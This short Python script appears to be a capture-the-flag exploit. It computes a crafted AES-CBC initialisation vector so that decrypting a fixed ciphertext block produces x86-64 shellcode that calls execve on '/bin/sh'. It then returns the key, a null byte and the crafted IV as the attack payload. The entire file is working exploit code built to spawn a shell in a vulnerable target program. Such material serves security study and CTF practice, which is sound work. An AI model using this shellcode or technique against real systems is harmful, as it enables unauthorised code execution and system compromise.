from Crypto.Cipher import AES
import struct

DUMMY_KEY = 'aaaaaaaaa/bin/sh'

CIPHER = "\xc8V\xf9]\x1fk\xcd'\\\xd8~\x91\xa8\x90\xa3\x1dI^\xc0\x92)C\xb7\xb9\x9a\xb1I\x1e\x88O\x16\x8E"
CIPHER_16 = CIPHER[:16]

SHELLCODE = 'H\x8d|$\x19\x99RWT^j;X\x0f\x05\x90'


def assert_will_be_shellcode(crafted_iv, shellcode):
	assert shellcode == AES.AESCipher(DUMMY_KEY, IV=crafted_iv, mode=AES.MODE_CBC).decrypt(CIPHER_16)

def make_shellcode():
	return make(SHELLCODE)
	
def make(shellcode):
	global DUMMY_KEY
	
	# AES without IV - ECB mode
	plain_aes = AES.new(DUMMY_KEY)
	crafted_iv = plain_aes.decrypt(CIPHER_16)
	byte_arr = []
	for i in xrange(16):
		byte_arr.append(chr(ord(crafted_iv[i]) ^ ord(shellcode[i])))
	
	crafted_iv = "".join(byte_arr)
	assert_will_be_shellcode(crafted_iv, shellcode)
	
	return DUMMY_KEY + '\0' + crafted_iv